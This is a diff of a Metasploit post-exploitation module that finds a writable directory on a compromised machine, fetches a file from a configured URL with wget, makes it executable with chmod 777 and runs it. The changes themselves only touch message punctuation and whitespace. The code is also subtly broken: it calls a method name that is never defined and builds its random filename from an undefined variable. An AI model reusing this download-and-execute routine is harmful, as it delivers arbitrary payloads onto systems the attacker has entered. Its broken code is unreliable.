@@ -37,13 +37,14 @@ class Metasploit3 < Msf::Post
   #udhcpd.conf too, with SRVHOST dns address, that should be given to network's hosts via dhcp
 
   def run
-    vprint_status("Trying to find writable directory")
+    
+    vprint_status("Trying to find writable directory.")
     writable_directory = "/etc/" if is_writable_directory("/etc")
     writable_directory = "/mnt/" if (!writable_directory && is_writable_directory("/mnt"))
     writable_directory = "/var/" if (!writable_directory && is_writable_directory("/var"))
     writable_directory = "/var/tmp/" if (!writable_directory && is_writable_directory("/var/tmp"))
     if writable_directory
-      vprint_status("writable directory found, downloading file")
+      vprint_status("writable directory found, downloading file.")
       random_file_path = writable_directory + "/" + (""; 16.times{rand_str  << (65 + rand(25)).chr})
       cmd_exec("wget -O #{random_file_path} #{datastore['URL']}"); Rex::sleep(0.1)
       if file?(random_file_path)
@@ -51,16 +52,18 @@ class Metasploit3 < Msf::Post
         cmd_exec("chmod 777 #{random_file_path}"); Rex::sleep(0.1)
         vprint_status(cmd_exec("#{random_file_path}"))
       else
-        print_error("File not downloaded.")
+        print_error("Unable to download file.")
       end
     else
       print_error("Writable directory not found.")
     end
+
   end
 
   #This function checks if the target directory is writable
-
+  
   def is_writable_dir(directory_path)
+  
     retval = false
     rand_str = ""; 16.times{rand_str  << (65 + rand(25)).chr}
     file_path = directory_path + "/" + rand_str
@@ -71,6 +74,7 @@ class Metasploit3 < Msf::Post
     end
     cmd_exec("rm #{file_path}"); Rex::sleep(0.1)
     return retval
+    
   end
 
 end
